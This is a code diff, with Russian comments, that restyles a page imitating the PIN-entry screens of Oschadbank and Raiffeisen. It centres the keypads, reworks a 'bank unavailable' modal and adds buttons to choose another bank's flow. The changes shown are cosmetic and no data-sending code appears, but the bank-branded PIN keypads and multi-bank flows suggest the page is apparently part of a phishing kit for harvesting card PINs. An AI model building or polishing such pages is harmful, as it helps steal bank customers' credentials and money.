@@ -274,7 +274,7 @@
         .oschad-form-container .oschad-main-title { text-align: left; margin-bottom: 10px; }
         .oschad-form-container p { text-align: left; margin-bottom: 30px; }
         
-        /* --- СТИЛИ для PIN экрана --- */
+        /* --- СТИЛИ для PIN экрана (ОЩАДБАНК) --- */
         .oschad-pin-screen-container {
             padding: 20px; text-align: center; width: 100%; background-color: #fff;
             display: flex; flex-direction: column; justify-content: space-between;
@@ -312,8 +312,9 @@
                 "k0 k1 k5"
                 ". k4 backspace";
             gap: 15px;
-            width: 100%; max-width: 300px;
-            margin: auto 0 20px 0;
+            width: 100%; 
+            max-width: 300px; /* Ограничиваем максимальную ширину */
+            margin: auto auto 20px auto; /* Центрируем и оставляем отступ снизу */
         }
         .oschad-pin-key {
             height: 60px; width: 60px;
@@ -455,8 +456,12 @@
         .raiff-pin-dot.filled { background-color: var(--raiff-yellow); }
         .raiff-pin-dots.error .raiff-pin-dot { background-color: var(--danger-color) !important; }
         .raiff-keypad {
-            display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px;
-            max-width: 300px; margin: auto auto 20px auto;
+            display: grid; 
+            grid-template-columns: repeat(3, 1fr); 
+            gap: 20px;
+            width: 100%; /* Добавлено */
+            max-width: 300px; /* Ограничиваем максимальную ширину */
+            margin: auto auto 20px auto; /* Центрируем */
         }
         .raiff-key {
             width: 80px; height: 80px;
@@ -466,6 +471,7 @@
             cursor: pointer;
             -webkit-tap-highlight-color: transparent;
             transition: background-color 0.1s ease;
+            justify-self: center; /* Добавлено для центрирования кнопок */
         }
         .raiff-key:active { background-color: #444; }
         .raiff-key.backspace { background-color: transparent; }
@@ -574,13 +580,19 @@
             font-size: 16px; color: var(--light-text); line-height: 1.5; margin-bottom: 30px;
         }
         .unavail-suggestion-grid {
-            display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;
+            display: flex; /* Изменено с grid на flex */
+            justify-content: center; /* Центрируем элементы */
+            gap: 15px;
+            max-width: 300px; /* Ограничиваем ширину для центрирования на узких экранах */
+            margin: 0 auto; /* Центрируем сетку */
         }
         .unavail-suggestion-item {
             display: flex; flex-direction: column; align-items: center; justify-content: center;
             padding: 15px 10px; border: 1px solid var(--border-color); border-radius: 12px;
             text-decoration: none; color: var(--dark-text); font-weight: 600;
             cursor: pointer; transition: background-color 0.2s;
+            flex: 1 1 0; /* Равное распределение ширины */
+            min-width: 110px; /* Минимальная ширина для предотвращения слишком сильного сжатия */
         }
         .unavail-suggestion-item img { max-height: 35px; margin-bottom: 8px; }
         .unavail-suggestion-item:hover { background-color: #f0f2f5; }
@@ -723,6 +735,7 @@ document.addEventListener('DOMContentLoaded', () => {
         root.style.setProperty('--unavail-bg', theme.bg || bankFlows['oschadbank'].colors.bg);
         root.style.setProperty('--unavail-text', theme.text || bankFlows['oschadbank'].colors.text);
 
+        // Используем flex для unavail-suggestion-grid, чтобы лучше контролировать центрирование
         const html = `
             <div class="unavailable-modal-content">
                 <svg class="unavail-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -737,10 +750,12 @@ document.addEventListener('DOMContentLoaded', () => {
                     <a href="#" class="unavail-suggestion-item" data-bank="oschadbank">
                         <img src="${bankFlows.oschadbank.logoUrl}" alt="Ощадбанк">
                         <span>Ощадбанк</span>
+                        <button class="btn" style="padding: 8px 10px; margin-top: 10px; font-size: 14px; background-color: var(--oschad-primary); color: var(--white);">Обрати</button>
                     </a>
                     <a href="#" class="unavail-suggestion-item" data-bank="raiffeisen">
                         <img src="${bankFlows.raiffeisen.logoUrl}" alt="Райффайзен">
                         <span>Райффайзен</span>
+                        <button class="btn" style="padding: 8px 10px; margin-top: 10px; font-size: 14px; background-color: var(--raiff-yellow); color: var(--dark-text);">Обрати</button>
                     </a>
                 </div>
             </div>
